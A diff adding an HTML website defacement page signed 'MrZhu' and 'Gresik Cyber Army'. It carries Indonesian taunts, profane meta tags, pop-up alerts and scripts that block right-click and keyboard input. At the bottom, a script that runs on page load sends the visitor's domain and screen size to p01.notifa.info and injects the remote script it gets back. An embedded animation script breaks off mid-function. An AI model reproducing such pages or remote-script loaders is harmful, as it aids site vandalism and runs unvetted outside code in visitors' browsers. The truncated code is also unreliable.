@@ -1,0 +1,125 @@
+<html lang="en-US">
+ <head>
+  <title>.: TOUCHED BY MRZHU :.</title>
+  <center>
+  	 <SCRIPT>
+var width=document.body.clientWidth;
+var height=document.body.clientHeight;
+
+function doClickText(who,type,step,timeOut) {
+document.getElementById(who).style.display="none";
+if(type==0) {
+reveal('revealDiv1',step,timeOut,0);
+reveal('revealDiv2',step,timeOut,1);}
+if(type==1) {
+reveal('revealDiv1',step,timeOut,2);
+reveal('revealDiv2',step,timeOut,3);}}
+function reveal(who,step,timeOut,type) {
+if(type==0)
+var where="top";
+if(type==1)
+var where="bottom";
+if(type==2)
+var where="left";
+if(type==3)
+var where="right";
+eval('var temp=document.getElementById(who).style.'+where);
+temp=parseInt(temp);
+if(type==0||type==1)
+var checkWith=height/2;
+if(type==2||type==3)
+var checkWith=width/2;
+if(-temp<checkWith) {
+
+temp-=step;
+
+eval('document.getElementById(who).style.'+where+'=temp;');
+
+setTimeout("reveal('"+who+"',"+step+",'"+timeOut+"',"+type+")", timeOut);}
+
+else {
+
+document.getElementById(who).style.display="none";
+
+document.body.scroll="yes";}}
+
+function initReveal(type,div1bg,div2bg,div1bw,div2bw,div1bc,div2bc,step,timeOut,click) {
+
+if(type==0) {
+
+var bWhere1="border-bottom";
+
+var bWhere2="border-top";
+
+var putZero1="top:0px; left:0px";
+
+var putZero2="bottom:0px; left:0px";
+
+document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
+document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
+if(!click) {
+reveal('revealDiv1',step,timeOut,0);
+reveal('revealDiv2',step,timeOut,1);}
+
+else {
+clickText(type,step,timeOut);}}
+
+if(type==1) {
+var bWhere1="border-right";
+var bWhere2="border-left";
+var putZero1="top:0px; left:0px";
+var putZero2="top:0px; right:0px";
+document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
+document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
+if(!click) {
+reveal('revealDiv1',step,timeOut,2);
+reveal('revealDiv2',step,timeOut,3);}
+else {
+clickText(type,step,timeOut);}}
+function clickText(type,step,timeOut) {
+document.write('<div id="clickText" style="z-index:101; display:block; position:absolute; top:'+(height/2-clickh/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'"><table style="border:'+clickc+' solid '+clickb+'px; background:'+clickbg+' ;width:'+clickw+'px; height:'+clickh+'; '+clickFont+'; cursor:hand; cursor:pointer" onClick="doClickText(\'clickText\','+type+','+step+','+timeOut+')"><tr><td align="middle">'+clickt+'</td></tr></table></div>');}}
+
+</SCRIPT>
+<SCRIPT>
+var clickw=270;
+var clickh=50;
+var clickb=2;
+var clickc="black";
+var clickbg="black"; // Background color
+var clickt="=[[ <blink>TEKAN DISINI</blink>  ]]="; // Text to display
+var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:white"; // The font style of the text
+new initReveal(0,'black','black',1,1,'lime','lime',3,10,true);
+</SCRIPT>
+  <meta property="og:title" content="Was Here">
+  <meta property="og:description" content="~ TERUNTUK KAMU Bangsat ~">
+  <meta property="og:author" content="FuckYou">
+  <meta charset="UTF-8">
+  <style>body{background:#000;
+ cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur862.ani),
+ url(http://i65.tinypic.com/2rxchvl.jpg),
+ progress !important; } </style> <script>alert('Hacked By MrZhu In Here')</script>
+
+
+<script>alert(' Entah apa yang merasukimu !!! ')</script>
+<script>alert(' Hingga kutega merubah isi hati ini !!! ')</script>
+ </head>
+ <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+
+  <img scr="https://lh3.googleusercontent.com/0hFV_AZXZg0tdEb0-_nW3MUZ-qhvcuEiBeM7Fx9798VZXSqjKb6NpaRNmCQKA-ILJ1SJ-HA=s85.jpg">
+   <br>
+   <br>
+   <font color="cyan" face="courier new" size="4"> Kalau hubunganku dengan Dia terlarang, mengapa Engkau ciptakan rasa yang begitu hebat ini kepadanya !!! <br><br> SadBoys by ; MrZhu404_ID <font color="cyan"> </font>
+   <br>
+   <br>
+   <font color="red" face="Joti One" size="3"><font color="RED"> TOUCHED BY </font> <br> <font color="red" face="courier new">MRZHU_<font color="white">IN_<font color="#00BFFF">HERE</font> <br><font color="white">[
+       <marquee behavior="alternate" scrollamount="50" width="250" style="width: 250px;">
+       <font size="4" color="red">______<font size="4" color="yellow">______<font size="4" color="#1CFF00">_______<font size="4" color="#00A7FF">______</font></font></font></font>
+       </marquee>]<br><br></font> <font color="#7CFC00" face="courier new" size="5">"Jangan pernah meremehkan kemampuan orang lain ! meskipun <br> keahliannya hanya memandang layar kaca yang<br> penuh dengan tulisan berwarna. <br> Pedoman kami cuma satu ! yaitu<br> tidak ada sistem yang aman dan<br> tidak ada sesuatu yang mustahil ! Kami bisa menyakiti tanpa harus bertanya kata sandi !!!"</font><br> <font color="#7CFC00" face="courier new" size="2"MR ZHU<br><br><br><strong>~I Am MrZhu~ <br><br><br><br><br><br><br><br> <p class="style14" align="center"> <font color="#ffffff" face="courier new" size="4">"_Ingat dan camkaN_"</font>
+        <marquee bgcolor="black" scrolldelay="10" scrollamount="8" direction="left" behavior="scroll" width="80%" style="width: 80%;">
+         <font color="#7CFC00" face="courier new" size="6"> [+] ORANG JAHAT TERCIPTA DARI ORANG BAIK YANG DILECEHKAN !!! GRESIK CYBER ARMY  [+]   </font>
+        </marquee><br></p><p align="center">
+        <canvas id="canvas"></canvas> <script>
+var Stats=function(){var e=Date.now(),t=e,i=0,n=1/0,r=0,s=0,o=1/0,a=0,l=0,h=0,c=document.createElement("div");c.id="stats",c.addEventListener("mousedown",function(e){e.preventDefault(),v(++h%2)},!1),c.style.cssText="width:80px;opacity:0.9;cursor:pointer";var u=document.createElement("div");u.id="fps",u.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#002",c.appendChild(u);var d=document.createElement("div");d.id="fpsText",d.style.cssText="color:#0ff;font-family:Comic Sans MS;font-size:9px;font-weight:bold;line-height:15px",d.innerHTML="FPS",u.appendChild(d);var p=document.createElement("div");for(p.id="fpsGraph",p.style.cssText="position:relative;width:74px;height:30px;background-color:#0ff",u.appendChild(p);74>p.children.length;){var f=document.createElement("span");f.style.cssText="width:1px;height:30px;float:left;background-color:#113",p.appendChild(f)}var m=document.createElement("div");m.id="ms",m.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#020;display:none",c.appendChild(m);var g=document.createElement("div");g.id="msText",g.style.cssText="color:#0f0;font-family:Comic Sans MS;font-size:9px;font-weight:bold;line-height:15px",g.innerHTML="MS",m.appendChild(g);var y=document.createElement("div");for(y.id="msGraph",y.style.cssText="position:relative;width:74px;height:30px;background-color:#0f0",m.appendChild(y);74>y.children.length;){var f=document.createElement("span");f.style.cssText="width:1px;height:30px;float:left;background-color:#131",y.appendChild(f)}var v=function(e){switch(h=e){case 0:u.style.display="block",m.style.display="none";break;case 1:u.style.display="none",m.style.display="block"}},b=function(e,t){var</script></p></font></font></font></font>
+  </center>
+ <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2P%2fdbgxRFe25sfMVwB%2babtOucFfrCP9EPr9o8ixP2oDVnaGSEp8ktnqbgsJjqa%2byyWCOOuNGTSjaxpy3hjRB6jx2EqlWVLWFr%2bwoFM4%2bunUuBTSmI%2b%2fyJRGGGy6oqHth1FjI5DazcEbB61dQwXnitMQfG7fdsKHgmSkrkssK9%2bah86CY84kdS4TzklMSZcJGGT8xXeH7lFUygVKicL5F4Oac2f6c%2fIt18H9z44Aqj%2f72zu8yN6JfQnUHy67viW8l8MQywt1JX5ILP74osD%2bjyuSE%2bqfkyCaJhr5VY5l0lUZupKRFZi9tjkzkaiTXFjfR2DiOOu4wcYxCfS0fAM4INOPIQGjJw%2fMkW%2fzKMRTH8%2fY%2fFWdhrQV1IKO1Q9DS5y%2fGei%2fe1aSMmHNmqjGUj50iqddnGW3qebUQuDrqHhFQiOR4RNhPtUENjyBLal2XBQqMddLYbm79myEOwPOg9OHbyAU7zsQBE%2fFSvklLP%2f%2fXuAoycwUYPxs9cAOIkSwnUdN9Z" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
